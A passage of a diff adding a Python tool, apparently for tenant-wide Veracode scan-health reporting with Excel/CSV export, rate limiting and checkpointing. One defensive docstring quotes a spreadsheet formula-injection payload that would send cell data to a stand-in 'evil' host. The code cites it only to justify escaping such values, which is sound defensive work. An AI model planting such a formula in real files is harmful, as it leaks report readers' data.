@@ -1,0 +1,4615 @@
+#!/usr/bin/env python3
+"""
+Veracode Tenant-Wide Scan Health
+Python port of https://github.com/veracode/scan_health (Go v2.47)
+Extended for tenant-wide iteration, Excel/CSV/JSON export, trend analysis.
+
+Requirements:
+    pip install veracode-api-signing requests openpyxl
+"""
+
+from __future__ import annotations
+
+import contextlib
+import os
+import sys
+import csv
+import json
+import math
+import re
+import time
+import logging
+import argparse
+import threading
+import xml.etree.ElementTree as ET
+from collections import Counter
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field, asdict
+from datetime import datetime, timezone
+from html import unescape
+from pathlib import Path
+from typing import Any, Callable, Iterable, Sequence
+
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from veracode_api_signing.plugin_requests import RequestsAuthPluginVeracodeHMAC
+from openpyxl import Workbook, load_workbook
+from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
+from openpyxl.utils import get_column_letter
+
+try:  # optional hardening; the stdlib parser is used when it is absent
+    from defusedxml.ElementTree import fromstring as _defused_fromstring
+except ImportError:  # pragma: no cover - depends on environment
+    _defused_fromstring = None
+
+log = logging.getLogger("scan_health")
+
+# ==========================================================================
+# Constants
+# ==========================================================================
+MAX_FILE_COUNT = 10000
+MAX_MODULE_COUNT = 500
+MAX_SELECTED_MODULE_COUNT = 100
+MAX_FLAW_COUNT = 2500
+MAX_TOTAL_MODULE_SIZE = 1_000_000_000
+MAX_ANALYSIS_SIZE = 500_000_000
+STALE_SCAN_DAYS = 30
+
+REGIONS: dict[str, dict[str, str]] = {
+    "commercial": {"base": "https://analysiscenter.veracode.com", "xml": "https://analysiscenter.veracode.com/api/5.0", "rest": "https://api.veracode.com/appsec/v1"},
+    "eu":         {"base": "https://analysiscenter.veracode.eu",  "xml": "https://analysiscenter.veracode.eu/api/5.0",  "rest": "https://api.veracode.eu/appsec/v1"},
+}
+
+_NS_B = re.compile(rb'\sxmlns="[^"]+"')
+_DT_FMTS = ("%Y-%m-%dT%H:%M:%S%z", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S %Z", "%Y-%m-%d %H:%M:%S UTC")
+_URL_RE = re.compile(r'https?://\S+')
+
+# FancyList pattern lists
+JUNK_FILE_PATTERNS = ["!LICENSE*",".*","*.asmx","*.config","*.cs","*.eot","*.gif","*.ico","*.jpeg","*.jpg","*.less","*.manifest","*.map","*.markdown","*.md","*.pdf","*.png","*.properties","*.scss","*.sh","*.svg","*.ttf","*.txt","*.woff","*.xml","AUTHORS","CHANGELOG","CONTRIBUTORS","Dockerfile","LICENSE","Makefile","README","Thumbs.db"]
+THIRD_PARTY_PATTERNS = ["7z.dll","7-zip.dll","Google.*.dll","7za.exe","AutoMapper.dll","AutoMapper.*.dll","Azure.*.dll","BouncyCastle.*","Castle.Core.*","Castle.Windsor.*","componentspace.saml2.dll","Dapper.dll","Dapper.*.dll","devexpress.*","entityframework.*","Google.Protobuf.dll","gradle-wrapper.jar","GraphQL.*.dll","itextsharp.dll","log4net.dll","microsoft.*.dll","microsoft.*.pdb","!^_Microsoft.","!^_System.","!^_Azure.","newrelic.*.dll","newtonsoft.json.*","ninject.*.dll","org.eclipse.*.jar","Serilog.dll","syncfusion.*","system.*.dll","Telerik.*.dll","WebGrease.dll","phantomjs.exe","Moq.dll","ComponentSpace.SAML2.dll","^aspnet-codegenerator","sni.dll","AntiXssLibrary.dll","Antlr3.Runtime.dll","FluentValidation.dll"]
+SENSITIVE_SECRET_PATTERNS = ["*.asc","*.crt","*.gpg","*.jks","*.key","*.p7b","*.p7s","*.pem","*.pfx","*.pgp","*.p12","*.tfvars","variable.tf",".htpasswd"]
+SENSITIVE_BACKUP_PATTERNS = ["*.bac","*.back","*.backup","*.old","*.orig","*.bak"]
+SENSITIVE_WORD_PATTERNS = ["*.docx","*.doc","*.docm","*.odt"]
+SENSITIVE_SPREADSHEET_PATTERNS = ["*.xlsx","*.xls","*.xlsm","*.ods"]
+SENSITIVE_JUPYTER_PATTERNS = ["*.ipynb"]
+TEST_FILE_PATTERNS = ["nunit.framework.dll","Moq.dll","^.test.","!Test*","!*Test","!^Test.","!^Tests.","*.unittests.dll","*.unittest.dll","^mock","^unittest","^harness","*.feature","*.js.snap"]
+UNWANTED_7Z = ["*.7z"]
+UNWANTED_COFFEE = ["*.coffee"]
+UNWANTED_SCRIPTS = ["*.sh","*.ps","*.ps1","*.bat"]
+UNWANTED_INSTALLERS = ["setup.exe","*setup.exe","*.msi","installer.exe","*installer.exe","*.msix","*.appx","*.msixbundle",".appxbundle"]
+UNWANTED_PYD = ["*.pyd"]
+UNWANTED_PYC = ["*.pyc"]
+UNWANTED_DEPLOY = ["*.deploy"]
+UNWANTED_WIBU = ["WibuCmNET.dll"]
+SRC_JAVA = ["*.java"]; SRC_CS = ["*.cs"]; SRC_SLN = ["*.sln"]; SRC_CSPROJ = ["*.csproj"]; SRC_C = ["*.c"]; SRC_CPP = ["*.cpp"]; SRC_SWIFT = ["*.swift"]
+SCA_SUPPORTED = ["*.dll","*.exe","*.jar","*.apk","*.aab","*.war","*.ear","*.js","*.ts","*.php","*.lock","package-lock.json","npm-shrinkwrap.json","go.sum","vendor.json","*.deps.json","*.py"]
+DOTNET_PRECOMPILE_PATTERNS = ["*.cshtml","*.ascx","*.aspx","*.asax"]
+GO_WORKSPACE_PATTERNS = ["go.work","go.work.sum"]
+EXCESS_MSFT_PATTERNS = ["csc.exe"]
+LOOSE_CLASS_FILE = ["*.class"]; LOOSE_CLASS_MODULE = ["class files within*"]
+GRADLE_WRAPPER = ["gradle-wrapper.jar"]
+
+# Excel styling
+_HF = PatternFill("solid", fgColor="1F4E79")
+_HN = Font(bold=True, color="FFFFFF", name="Arial", size=10)
+_DF = Font(name="Arial", size=10)
+_BF = Font(bold=True, name="Arial", size=10)
+_CA = Alignment(horizontal="center", vertical="center")
+_WA = Alignment(horizontal="left", vertical="top", wrap_text=True)
+_TH = Side(style="thin", color="CCCCCC")
+_BD = Border(left=_TH, right=_TH, top=_TH, bottom=_TH)
+_CLR = {"Good": "C6EFCE", "Fair": "FFEB9C", "Poor": "FFC7CE"}
+_AGE_CLR = {"<7d": "C6EFCE", "7-30d": "C6EFCE", "30-90d": "FFEB9C", "90d+": "FFC7CE", "N/A": "FFFFFF"}
+
+# ==========================================================================
+# Dataclasses
+# ==========================================================================
+
+@dataclass
+class Issue:
+    severity: str
+    description: str
+    check_num: int = 0
+    check_name: str = ""
+
+CHECK_CATEGORIES: dict[int, str] = {
+    1: "Packaging", 2: "Module Selection", 3: "Flaw Analysis",
+    4: "Fatal Errors", 5: "Fatal Errors", 6: "Packaging",
+    7: "Packaging", 8: "Packaging", 9: "SCA",
+    10: "Module Selection", 11: "Packaging", 12: "Module Quality",
+    13: "Module Quality", 14: "Fatal Errors", 15: "Module Selection",
+    16: "Security Risk", 17: "Security Risk", 18: "Packaging",
+    19: "Packaging", 20: "Packaging", 21: "Packaging",
+    22: "Packaging", 23: "Packaging", 24: "Module Selection",
+    25: "Module Selection", 26: "Module Selection", 27: "Packaging",
+    28: "Packaging", 29: "Module Selection", 30: "Scan Recency",
+    31: "Packaging",
+}
+
+@dataclass
+class FlawSummary:
+    total: int = 0; fixed: int = 0; pol_aff: int = 0
+    mitigated: int = 0; open_pol: int = 0; open_nopol: int = 0
+    # Open (not fixed, not mitigated) flaws by Veracode severity level.
+    # 5 = Very High, 4 = High, 3 = Medium, 2/1/0 rolled up as Low.
+    # sev_available is False when the severity breakdown could not be derived,
+    # so the dashboard can render "unknown" rather than implying zero.
+    open_vhigh: int = 0; open_high: int = 0
+    open_med: int = 0; open_low: int = 0
+    sev_available: bool = False
+
+@dataclass
+class ScanResult:
+    app_name: str = ""; bu: str = ""; policy: str = ""; app_id: int = 0
+    sandbox: str = ""; build_id: str = ""; scan_name: str = ""
+    is_latest: bool = True; scan_status: str = "No Scan"
+    published: str = ""; days_since: object = "N/A"; duration: str = ""
+    duration_seconds: int | None = None   # None when either date is missing
+    engine: str = ""; analysis_size_mb: float = 0.0
+    va_score: object = ""; va_rating: str = ""
+    policy_status: str = ""; policy_name: str = ""
+    files_uploaded: int = 0; total_modules: int = 0
+    selected_modules: int = 0; fatal_errors: int = 0
+    flaws: FlawSummary = field(default_factory=FlawSummary)
+    health: str = "Good"; high_issues: int = 0; medium_issues: int = 0
+    total_issues: int = 0; issues_text: str = "None"; recs_text: str = "None"
+    review_url: str = ""; triage_url: str = ""
+    selected_names: str = ""; sca_count: int = 0; age_bucket: str = "N/A"
+    total_upload_mb: float = 0.0; health_trend: str = ""
+
+    def to_row(self) -> dict:
+        return {
+            "App Name": self.app_name, "Business Unit": self.bu, "Policy": self.policy,
+            "App ID": self.app_id, "Sandbox": self.sandbox,
+            "Build ID": self.build_id, "Scan Name": self.scan_name,
+            "Is Latest": self.is_latest, "Scan Status": self.scan_status,
+            "Published": self.published, "Days Since Scan": self.days_since,
+            "Duration": self.duration, "Engine": self.engine,
+            "Analysis Size (MB)": self.analysis_size_mb,
+            "Veracode Score": self.va_score,
+            "Veracode Rating": self.va_rating,
+            "Policy Status": self.policy_status,
+            "Total Upload Size (MB)": self.total_upload_mb,
+            "Files Uploaded": self.files_uploaded,
+            "Total Modules": self.total_modules,
+            "Selected Modules": self.selected_modules,
+            "Selected Module Names": self.selected_names,
+            "Fatal Errors": self.fatal_errors,
+            "Total Flaws": self.flaws.total,
+            "Open Affecting Policy": self.flaws.open_pol,
+            "Mitigated": self.flaws.mitigated, "Fixed": self.flaws.fixed,
+            "Policy Affecting": self.flaws.pol_aff,
+            "Open Very High Flaws": self.flaws.open_vhigh,
+            "Open High Flaws": self.flaws.open_high,
+            "Open Medium Flaws": self.flaws.open_med,
+            "Open Low Flaws": self.flaws.open_low,
+            "Flaw Severity Data": "Available" if self.flaws.sev_available else "Unavailable",
+            "SCA Components": self.sca_count,
+            "Scan Age Bucket": self.age_bucket,
+            "Health": self.health, "Health Trend": self.health_trend,
+            "High Issues": self.high_issues, "Medium Issues": self.medium_issues,
+            "Total Issues": self.total_issues,
+            "Issues": self.issues_text, "Recommendations": self.recs_text,
+            "Review Modules URL": self.review_url, "Triage Flaws URL": self.triage_url,
+            # Appended last so no existing column moves.
+            "Duration (s)": self.duration_seconds,
+        }
+
+@dataclass
+class ModuleRow:
+    app_name: str = ""; build_id: str = ""; name: str = ""
+    status: str = ""; selected: bool = False; dependency: bool = False
+    fatal: bool = False; third_party: bool = False; ignored: bool = False
+    platform: str = ""; compiler: str = ""; size: str = ""
+    issues: str = ""
+    def to_row(self) -> dict:
+        return {"App Name": self.app_name, "Build ID": self.build_id, "Module": self.name,
+                "Status": self.status, "Selected": self.selected, "Dependency": self.dependency,
+                "Fatal": self.fatal, "3rd Party": self.third_party, "Ignored": self.ignored,
+                "Platform": self.platform, "Compiler": self.compiler, "Size": self.size,
+                "Issues": self.issues}
+
+@dataclass
+class FileRow:
+    app_name: str = ""; build_id: str = ""; name: str = ""
+    status: str = ""; md5: str = ""; ignored: bool = False; third_party: bool = False
+    def to_row(self) -> dict:
+        return {"App Name": self.app_name, "Build ID": self.build_id, "File": self.name,
+                "Status": self.status, "MD5": self.md5, "Ignored": self.ignored, "3rd Party": self.third_party}
+
+@dataclass
+class RecommendationRow:
+    app_name: str = ""; build_id: str = ""; severity: str = ""
+    recommendation: str = ""; doc_url: str = ""
+    def to_row(self) -> dict:
+        return {"App Name": self.app_name, "Build ID": self.build_id,
+                "Severity": self.severity, "Recommendation": self.recommendation,
+                "Doc URL": self.doc_url}
+
+@dataclass
+class TrendRow:
+    app_name: str = ""; sandbox: str = ""
+    prev_health: str = ""; curr_health: str = ""; change: str = ""
+    prev_flaws: int = 0; curr_flaws: int = 0; flaw_delta: int = 0
+    prev_open_pol: int = 0; curr_open_pol: int = 0; open_pol_delta: int = 0
+    def to_row(self) -> dict:
+        return {"App Name": self.app_name, "Sandbox": self.sandbox,
+                "Previous Health": self.prev_health, "Current Health": self.curr_health,
+                "Health Change": self.change,
+                "Previous Total Flaws": self.prev_flaws, "Current Total Flaws": self.curr_flaws,
+                "Flaw Delta": self.flaw_delta,
+                "Previous Open Policy": self.prev_open_pol, "Current Open Policy": self.curr_open_pol,
+                "Open Policy Delta": self.open_pol_delta}
+
+@dataclass
+class AggIssue:
+    """Structured issue record for accurate tenant-level aggregation."""
+    app_name: str
+    bu: str
+    sandbox: str
+    check_num: int
+    check_name: str
+    category: str
+    severity: str
+    description: str
+    recommendation: str
+
+# ==========================================================================
+# Helpers
+# ==========================================================================
+
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _parse_retry_after(value: str | None) -> float | None:
+    """Parse a Retry-After header. RFC 9110 permits either delay-seconds or an
+    HTTP-date, and Veracode may send either, so both are handled. Returns None
+    when absent or unparseable, and clamps to a sane ceiling so a malformed or
+    hostile value cannot stall the run for hours."""
+    if not value:
+        return None
+    v = value.strip()
+    try:
+        return max(0.0, min(float(v), 300.0))
+    except ValueError:
+        pass
+    try:
+        from email.utils import parsedate_to_datetime
+        dt = parsedate_to_datetime(v)
+        if dt is None:
+            return None
+        if dt.tzinfo is None:
+            dt = dt.replace(tzinfo=timezone.utc)
+        return max(0.0, min((dt - datetime.now(timezone.utc)).total_seconds(), 300.0))
+    except Exception:
+        return None
+
+
+def _safe_cell(v: object) -> object:
+    """Neutralise spreadsheet formula injection.
+
+    App names, module names and uploaded file names are attacker-controlled:
+    anyone able to create an app profile or upload an artifact chooses them.
+    openpyxl types a leading '=' as a real formula, so a value such as
+    =HYPERLINK("http://evil/?d="&A1,"x") executes when a reviewer opens the
+    report. Prefixing with an apostrophe forces text without altering the
+    visible value. Numbers, dates and bools are passed through untouched.
+    """
+    if isinstance(v, str) and v.startswith(_FORMULA_LEAD):
+        return "'" + v
+    return v
+
+
+def _si_or_none(v: Any) -> int | None:
+    """Int or None. Distinguishes 'absent' from 'zero', which matters for any
+    Veracode-supplied score where 0 is a real and very bad value."""
+    if v is None or v == "":
+        return None
+    try:
+        return int(float(v))
+    except (ValueError, TypeError):
+        return None
+
+
+def _si(v: Any, d: int = 0) -> int:
+    try: return int(v)
+    except (ValueError, TypeError): return d
+
+def _parse_dt(s: str) -> datetime | None:
+    if not s: return None
+    s = s.strip()
+    for f in _DT_FMTS:
+        try:
+            dt = datetime.strptime(s, f)
+            return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)
+        except ValueError: continue
+    return None
+
+def _days_since(s: str) -> int | None:
+    dt = _parse_dt(s)
+    return (datetime.now(timezone.utc) - dt).days if dt else None
+
+def _fmt_seconds(s: int) -> str:
+    """'1h 2m 3s' / '2m 3s' / '3s'."""
+    h, r = divmod(s, 3600); m, sec = divmod(r, 60)
+    if h: return f"{h}h {m}m {sec}s"
+    return f"{m}m {sec}s" if m else f"{sec}s"
+
+def _dur_seconds(sub: str, pub: str) -> int | None:
+    """Seconds from submitted to published, or None when either date is
+    missing or the interval is negative."""
+    a, b = _parse_dt(sub), _parse_dt(pub)
+    if a and b:
+        s = int((b - a).total_seconds())
+        if s >= 0:
+            return s
+    return None
+
+def _dur(sub: str, pub: str) -> str:
+    s = _dur_seconds(sub, pub)
+    return "" if s is None else _fmt_seconds(s)
+
+def _age_bucket(days: int | None) -> str:
+    if days is None: return "N/A"
+    if days < 7: return "<7d"
+    if days <= 30: return "7-30d"
+    if days <= 90: return "30-90d"
+    return "90d+"
+
+def _parse_module_size(size_str: str) -> int:
+    """Parse prescan module size string like '5MB', '120KB', '2GB' to bytes.
+
+    Veracode's samples show whole numbers ('15MB'), but a decimal value such
+    as '1.5MB' or '1.5 MB' must not silently count as zero, so the number is
+    parsed as a float. Unrecognised input still returns 0.
+    """
+    s = size_str.strip().upper()
+    for suffix, mult in [("GB", 1_000_000_000), ("MB", 1_000_000), ("KB", 1_000)]:
+        if s.endswith(suffix):
+            try: return int(float(s[:-len(suffix)].strip()) * mult)
+            except ValueError: return 0
+    return 0
+
+def _extract_url(text: str) -> str:
+    m = _URL_RE.search(text)
+    return m.group(0).rstrip(".") if m else ""
+
+def _is_java(n: str) -> bool: return n.lower().endswith((".jar",".war",".ear"))
+def _is_dotnet(n: str) -> bool: return n.lower().endswith((".dll",".exe"))
+def _is_js_module(n: str) -> bool:
+    lo = n.lower()
+    return lo.startswith("js files within") or lo.startswith("js files extracted from")
+def _is_node_module(n: str) -> bool: return "_nodemodule_" in n.lower()
+def _has_status(m: dict, s: str) -> bool: return s.lower() in m.get("status","").lower()
+
+def _top5(items: list[str]) -> str:
+    if len(items) <= 5: return ", ".join(f'"{i}"' for i in items)
+    return ", ".join(f'"{i}"' for i in items[:5]) + f" and {len(items)-5} others"
+
+# ==========================================================================
+# FancyList DSL (audited against Go utils/fancy_list.go)
+# ==========================================================================
+
+def _fancy_match(filename: str, patterns: list[str]) -> bool:
+    """Test a filename against a list of patterns using the FancyList DSL.
+
+    Pattern syntax:
+      - Default: case-insensitive equality match (e.g. "readme")
+      - Single *: wildcard. "*.exe" matches suffix, "abc.*" matches prefix,
+                  "abc.*.xyz" matches prefix+suffix. Only one * allowed.
+      - ^ prefix: contains search (e.g. "^test" matches if "test" in filename)
+      - ! prefix: force case-sensitive matching for the rest of the pattern.
+                  Can combine with * or ^ (e.g. "!^_Microsoft." is case-sensitive
+                  contains, "!Test*" is case-sensitive prefix).
+    """
+    fn = filename.strip()
+    for pat in patterns:
+        p = pat
+        # ! means case-sensitive; otherwise fold to lowercase
+        case_sensitive = p.count("!") == 1
+        if case_sensitive:
+            p = p.replace("!", "")
+            f = fn
+        else:
+            f = fn.lower()
+            p = p.lower()
+        # ^ means contains
+        if "^" in p and p.count("^") == 1:
+            p = p.replace("^", "")
+            if p in f:
+                return True
+            continue
+        # * wildcard (exactly one allowed)
+        if p.count("*") == 1:
+            if p.startswith("*"):
+                if f.endswith(p[1:]):
+                    return True
+            elif p.endswith("*"):
+                if f.startswith(p[:-1]):
+                    return True
+            else:
+                parts = p.split("*", 1)
+                if f.startswith(parts[0]) and f.endswith(parts[1]) and len(f) >= len(parts[0]) + len(parts[1]):
+                    return True
+        elif f == p:
+            return True
+    return False
+
+def _fancy_match_files(files: list[dict], patterns: list[str]) -> list[str]:
+    # dict keeps first-seen order with O(1) de-duplication; a list membership
+    # test made this quadratic on uploads with thousands of matching files.
+    found: dict[str, None] = {}
+    for f in files:
+        if f.get("is_ignored") or f.get("is_third_party"): continue
+        if f["name"] not in found and _fancy_match(f["name"], patterns):
+            found[f["name"]] = None
+    return list(found)
+
+def _fancy_match_modules(modules: list[dict], patterns: list[str], selected_only: bool = False) -> list[str]:
+    found: dict[str, None] = {}
+    for m in modules:
+        if selected_only and not m.get("is_selected"): continue
+        if m["name"] not in found and _fancy_match(m["name"], patterns):
+            found[m["name"]] = None
+    return list(found)
+
+# ==========================================================================
+# Checkpointing
+# ==========================================================================
+
+class Checkpoint:
+    """Append-only JSONL checkpoint, flushed and fsync'd after every profile.
+
+    One JSON record per completed application profile. Because the record is
+    written and fsync'd before the next profile starts, a run that dies for any
+    reason (auth failure, network partition, Ctrl-C, OOM, node reboot) loses at
+    most the profile in flight. Restarting with the same checkpoint path skips
+    everything already recorded and carries the earlier rows into the report.
+
+    The format is deliberately line-oriented so a truncated final record from a
+    hard kill costs one profile rather than the whole file, and so the raw data
+    remains recoverable with jq if the workbook write itself ever fails.
+
+    Module and file rows are deliberately NOT carried here. On a 14,000-profile
+    tenant those run to millions of rows, which would exhaust memory and blow
+    past Excel's row ceiling anyway. They stream straight to CSV via
+    DetailWriter instead. What stays in memory is bounded at roughly one row
+    per profile.
+    """
+    VERSION = 2
+    _KEYS = ("health", "recs", "trends", "agg")
+
+    def __init__(self, path: str | None) -> None:
+        self.path = Path(path) if path else None
+        self._lock = threading.Lock()
+        self._fh = None
+        self.done_keys: set[tuple[str, str]] = set()
+        self.rows: dict[str, list[dict]] = {k: [] for k in self._KEYS}
+        self.records_written = 0
+        if self.path and self.path.exists():
+            self._load(self.path)
+        if self.path:
+            self.path.parent.mkdir(parents=True, exist_ok=True)
+            self._fh = open(self.path, "a", encoding="utf-8")
+
+    def _load(self, path: Path) -> None:
+        bad = 0
+        with open(path, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    rec = json.loads(line)
+                except json.JSONDecodeError:
+                    # Truncated tail from a hard kill. Costs one profile, which
+                    # will simply be re-collected on this run.
+                    bad += 1
+                    continue
+                for k in self._KEYS:
+                    self.rows[k].extend(rec.get(k, []))
+                for key in rec.get("keys", []):
+                    self.done_keys.add((str(key[0]), str(key[1])))
+        log.info("[*] Checkpoint %s: resumed %d profile(s), %d row(s)%s",
+                 self.path, len(self.done_keys),
+                 sum(len(v) for v in self.rows.values()),
+                 f", discarded {bad} truncated record(s)" if bad else "")
+
+    def record(self, keys: Iterable[tuple[str, str]], **rowsets: list[dict]) -> None:
+        keys = [(str(a), str(b)) for a, b in keys]
+        rec: dict[str, Any] = {
+            "v": self.VERSION,
+            "ts": datetime.now(timezone.utc).isoformat(),
+            "keys": [list(k) for k in keys],
+        }
+        for k in self._KEYS:
+            rec[k] = rowsets.get(k, []) or []
+        line = json.dumps(rec, default=str)
+        with self._lock:
+            for k in self._KEYS:
+                self.rows[k].extend(rec[k])
+            self.done_keys.update(keys)
+            if self._fh is None:
+                return
+            self._fh.write(line + "\n")
+            self._fh.flush()
+            try:
+                os.fsync(self._fh.fileno())
+            except OSError as e:
+                # Never let a checkpoint problem take down the collection run.
+                log.warning("Checkpoint fsync failed: %s", e)
+            self.records_written += 1
+
+    def close(self) -> None:
+        with self._lock:
+            if self._fh:
+                try:
+                    self._fh.close()
+                finally:
+                    self._fh = None
+
+
+class DetailWriter:
+    """Streams per-module and per-file rows to CSV as they are produced.
+
+    These are the only unbounded outputs in the tool: a large tenant produces
+    tens of thousands of module rows and millions of file rows. Buffering them
+    in memory to build a workbook at the end costs gigabytes and then silently
+    truncates at Excel's 1,048,576-row ceiling. Streaming to CSV keeps memory
+    flat, keeps every row, and makes the data greppable during the run.
+
+    Files are opened in append mode so a resumed run continues the same CSVs.
+    """
+
+    def __init__(self, base_path: str, enabled: bool = True) -> None:
+        self.enabled = enabled
+        self._lock = threading.Lock()
+        self._writers: dict[str, Any] = {}
+        self._handles: dict[str, Any] = {}
+        self.counts: dict[str, int] = {"modules": 0, "files": 0}
+        self.paths: dict[str, str] = {}
+        if not enabled:
+            return
+        stem = Path(base_path).with_suffix("")
+        for kind, fields in (
+            ("modules", list(ModuleRow().to_row().keys())),
+            ("files", list(FileRow().to_row().keys())),
+        ):
+            p = Path(f"{stem}_{kind}.csv")
+            p.parent.mkdir(parents=True, exist_ok=True)
+            new = not p.exists() or p.stat().st_size == 0
+            fh = open(p, "a", newline="", encoding="utf-8")
+            w = csv.DictWriter(fh, fieldnames=fields, extrasaction="ignore")
+            if new:
+                w.writeheader()
+                fh.flush()
+            self._handles[kind] = fh
+            self._writers[kind] = w
+            self.paths[kind] = str(p)
+
+    def write(self, kind: str, rows: list[dict]) -> None:
+        if not self.enabled or not rows:
+            return
+        with self._lock:
+            w = self._writers[kind]
+            for r in rows:
+                w.writerow({k: _safe_cell(v) for k, v in r.items()})
+            self.counts[kind] += len(rows)
+            self._handles[kind].flush()
+
+    def close(self) -> None:
+        with self._lock:
+            for fh in self._handles.values():
+                try:
+                    fh.close()
+                except Exception:
+                    pass
+            self._handles.clear()
+            self._writers.clear()
+
+
+# ==========================================================================
+# Rate limiting
+# ==========================================================================
+
+class _Bucket:
+    """One endpoint class with its own published per-minute ceiling."""
+
+    def __init__(self, name: str, limit_rpm: int, budget_pct: float) -> None:
+        self.name = name
+        self.limit_rpm = float(limit_rpm)
+        self.target_rpm = max(1.0, self.limit_rpm * budget_pct / 100.0)
+        self.rpm = self.target_rpm
+        self.next_slot = 0.0
+        self.cooldown_until = 0.0
+        self.throttles = 0
+        self.requests = 0
+        self.last_change = 0.0
+
+
+class RateLimiter:
+    """Per-endpoint-class pacing against Veracode's published rate limits.
+
+    Veracode publishes three separate ceilings, all per IP address:
+        Flaw Report / Results XML APIs   80 calls/minute
+        All other XML APIs              250 calls/minute
+        All REST APIs                   500 calls/minute
+
+    A single global limiter has to be tuned for the tightest of the three, so
+    the 250/min bucket ends up running at a fraction of what it is allowed.
+    Pacing each class against its own ceiling is both faster and more accurate
+    about what is actually being consumed.
+
+    Requests within a bucket are spaced evenly rather than burst, so traffic
+    never spikes at the start of a minute window.
+
+    On a 429 the offending bucket halves its rate immediately (multiplicative
+    decrease), honours Retry-After, then recovers additively toward the
+    configured budget. Other buckets are untouched, because their ceilings are
+    independent.
+    """
+
+    LIMITS: dict[str, int] = {"report": 80, "xml": 250, "rest": 500}
+
+    # The Flaw Report and Results XML APIs share the tighter 80/min ceiling.
+    REPORT_ENDPOINTS: frozenset[str] = frozenset({
+        "detailedreport.do", "summaryreport.do", "generateflawreport.do",
+        "downloadflawreport.do", "detailedreportpdf.do", "summaryreportpdf.do",
+        "thirdpartyreportpdf.do", "sharedreport.do", "sharedreportpdf.do",
+        "getsharedreportinfo.do", "getsharedreportlist.do",
+    })
+
+    RECOVERY_INTERVAL = 30.0     # seconds between additive recovery steps
+
+    def __init__(self, budget_pct: float = 70.0) -> None:
+        self.budget_pct = max(1.0, min(100.0, budget_pct))
+        self._lock = threading.Lock()
+        self.buckets = {n: _Bucket(n, lim, self.budget_pct)
+                        for n, lim in self.LIMITS.items()}
+        self.started = time.monotonic()
+
+    @classmethod
+    def classify(cls, endpoint: str) -> str:
+        return "report" if endpoint in cls.REPORT_ENDPOINTS else "xml"
+
+    def _recover(self, b: _Bucket, now: float) -> None:
+        """Additive increase back toward the configured budget after a 429."""
+        if b.rpm >= b.target_rpm or now - b.last_change < self.RECOVERY_INTERVAL:
+            return
+        b.rpm = min(b.target_rpm, b.rpm + max(1.0, b.target_rpm * 0.1))
+        b.last_change = now
+        log.debug("Rate bucket '%s' recovering to %.0f/min", b.name, b.rpm)
+
+    def acquire(self, cls_name: str) -> None:
+        """Reserve the next slot in this bucket, then sleep outside the lock so
+        workers are paced without being serialised behind each other."""
+        b = self.buckets[cls_name]
+        with self._lock:
+            now = time.monotonic()
+            self._recover(b, now)
+            start = max(now, b.next_slot, b.cooldown_until)
+            b.next_slot = start + 60.0 / b.rpm
+            b.requests += 1
+            wait = start - now
+        if wait > 0:
+            time.sleep(wait)
+        # A 429 may have extended the cooldown while we were sleeping.
+        while True:
+            with self._lock:
+                extra = b.cooldown_until - time.monotonic()
+            if extra <= 0:
+                return
+            time.sleep(min(extra, 5.0))
+
+    def throttled(self, cls_name: str, retry_after: float | None) -> None:
+        b = self.buckets[cls_name]
+        with self._lock:
+            b.throttles += 1
+            cool = retry_after if retry_after is not None else min(60.0, 5.0 * b.throttles)
+            b.cooldown_until = max(b.cooldown_until, time.monotonic() + cool)
+            b.rpm = max(self.LIMITS[cls_name] * 0.05, b.rpm * 0.5)
+            b.last_change = time.monotonic()
+            new_rpm = b.rpm
+        log.warning("[!] Rate limited on the '%s' bucket%s. Pausing %.0fs and halving "
+                    "that bucket to %.0f/min (limit %d/min). Other buckets unaffected.",
+                    cls_name,
+                    f" (Retry-After {retry_after:g}s)" if retry_after is not None else "",
+                    cool, new_rpm, self.LIMITS[cls_name])
+
+    def report(self) -> list[str]:
+        elapsed_min = max((time.monotonic() - self.started) / 60.0, 1e-6)
+        out: list[str] = []
+        for n, b in self.buckets.items():
+            if not b.requests:
+                continue
+            observed = b.requests / elapsed_min
+            out.append(f"{n}: {b.requests:,} requests, {observed:.0f}/min observed "
+                       f"vs {b.limit_rpm:.0f}/min limit "
+                       f"({_pct(observed, b.limit_rpm):.0f}% of ceiling), "
+                       f"{b.throttles} throttle event(s)")
+        return out
+
+
+# ==========================================================================
+# XML response parsers
+#
+# Split out of VeracodeClient so that a caller holding raw response bytes (the
+# single-application report reads them through its cache) parses them with
+# exactly the same code as the bulk path. The client methods are now thin
+# wrappers: fetch, then call one of these. Output is unchanged.
+# ==========================================================================
+
+def parse_xml_bytes(content: bytes) -> ET.Element:
+    """Parse an XML API response body.
+
+    Parses bytes, not text: the XML declaration is authoritative, while
+    requests' r.text falls back to charset guessing when the server sends no
+    charset, which can mis-decode non-ASCII app and file names. The default
+    namespace is stripped so element paths stay short.
+
+    Uses defusedxml when installed (defence in depth: it rejects entity
+    declarations outright). Its rejections are re-raised as ET.ParseError so
+    every caller's existing error handling applies unchanged.
+    """
+    body = _NS_B.sub(b"", content, count=0)
+    if _defused_fromstring is None:
+        return ET.fromstring(body)
+    try:
+        return _defused_fromstring(body)
+    except ValueError as e:      # defusedxml's DefusedXmlException family
+        raise ET.ParseError(f"rejected by defusedxml: {e}") from e
+
+
+def parse_build_list(root: ET.Element) -> list[dict]:
+    """getbuildlist.do: one dict per build, in response order.
+    Documented build attributes: build_id, version, policy_updated_date."""
+    return [{"build_id": b.get("build_id"), "version": b.get("version", ""),
+             "policy_updated_date": b.get("policy_updated_date", "")}
+            for b in root.findall(".//build")]
+
+
+def parse_sandbox_list(root: ET.Element) -> list[dict]:
+    """getsandboxlist.do: sandbox id and name. Veracode entity-escapes names
+    inside the XML attribute (a "/" arrives as "&#x2f;"), so they are unescaped
+    like every other name the tool reads."""
+    return [{"id": s.get("sandbox_id", ""), "name": unescape(s.get("sandbox_name", ""))}
+            for s in root.findall(".//sandbox")]
+
+
+def parse_build_info(root: ET.Element, bid: str | None = None) -> dict | None:
+    """getbuildinfo.do: build id, version, analysis status and published date.
+    None when the response carries no analysis_unit."""
+    au = root.find(".//analysis_unit")
+    if au is None: return None
+    build = root.find(".//build")
